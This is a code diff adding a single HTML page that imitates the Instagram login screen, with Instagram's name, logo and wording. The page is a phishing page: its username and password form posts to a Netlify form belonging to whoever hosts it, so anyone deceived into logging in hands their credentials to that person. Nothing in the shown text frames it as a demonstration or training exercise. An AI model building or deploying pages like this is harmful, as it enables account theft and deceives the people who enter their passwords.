@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
+    />
+    <style>
+      body {
+        font-family: "Roboto", sans-serif;
+        background-color: #f7f7f7;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      .container {
+        background: white;
+        border: 1px solid #dbdbdb;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        width: 350px;
+        padding: 40px 20px;
+        text-align: center;
+      }
+      .logo {
+        margin-bottom: 20px;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        margin: 8px 0;
+        border: 1px solid #dbdbdb;
+        border-radius: 4px;
+        font-size: 16px;
+        box-sizing: border-box;
+      }
+      button {
+        width: 100%;
+        padding: 12px;
+        background-color: #3897f0;
+        border: none;
+        color: white;
+        font-size: 18px;
+        border-radius: 4px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+      button:hover {
+        background-color: #357ae8;
+      }
+      .forgot-password {
+        margin-top: 10px;
+        font-size: 14px;
+        color: #00376b;
+      }
+      .forgot-password:hover {
+        text-decoration: underline;
+      }
+      .signup {
+        margin-top: 20px;
+        font-size: 14px;
+        color: #0095f6;
+      }
+      .signup a {
+        color: #0095f6;
+        text-decoration: none;
+      }
+      .signup a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <img
+        class="logo"
+        src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
+        alt="Instagram Logo"
+        width="100"
+      />
+      <h2>Instagram</h2>
+      <form name="login" method="POST" data-netlify="true">
+        <input type="hidden" name="form-name" value="login" />
+        <p>
+          <input
+            type="text"
+            name="username"
+            placeholder="Phone number, username, or email"
+            required
+          />
+        </p>
+        <p>
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+          />
+        </p>
+        <div data-netlify-recaptcha="true"></div>
+        <p>
+          <button type="submit">Log In</button>
+        </p>
+      </form>
+      <a class="forgot-password" href="#">Forgot password?</a>
+      <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+    </div>
+  </body>
+</html>
